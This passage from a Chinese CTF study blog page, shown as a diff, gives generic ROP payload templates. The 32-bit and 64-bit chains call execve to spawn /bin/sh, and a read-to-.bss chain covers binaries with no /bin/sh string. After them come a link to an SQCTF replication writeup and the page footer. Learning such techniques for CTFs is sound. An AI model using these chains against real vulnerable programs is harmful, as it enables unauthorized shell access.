+payload += p32(binsh_addr)          ebx = bin/sh（在程序里找或者自己构造）
+payload += p32(int_0x80_addr)  # int 0x80
+</code></pre>
+<p>64位</p>
+<pre><code class="language-plain">payload = b&#39;A&#39; * offset  
+payload += p64(pop_rax_ret)  
+payload += p64(0x3b)         # execve（64位为59，0x3b）
+payload += p64(pop_rdi_ret)  
+payload += p64(binsh_addr)   # rdi = bin/sh
+payload += p64(pop_rsi_ret)  # ROPgadget: pop rsi; ret
+payload += p64(0)            #每次对应置零
+payload += p64(pop_rdx_ret)  
+payload += p64(0)           
+payload += p64(syscall_addr)  #最后调用系统
+</code></pre>
+<p>没有bin&#x2F;sh的时候</p>
+<pre><code class="language-plain">payload += p32(read_plt)          # 调用 read 函数
+payload += p32(pop_ebx_ret)       # 清理栈帧（返回地址）
+payload += p32(0)                 # fd (stdin)
+payload += p32(bss_addr)          # 目标地址（.bss 段）
+payload += p32(8)                 # 写入长度（/bin/sh\x00）
+</code></pre>
+<h2 id="sqctf复现"><a href="#sqctf复现" class="headerlink" title="sqctf复现"></a>sqctf复现</h2><p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/Q2ztwN7nzihvsRkbuepcgk9onRd">yh3s</a></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
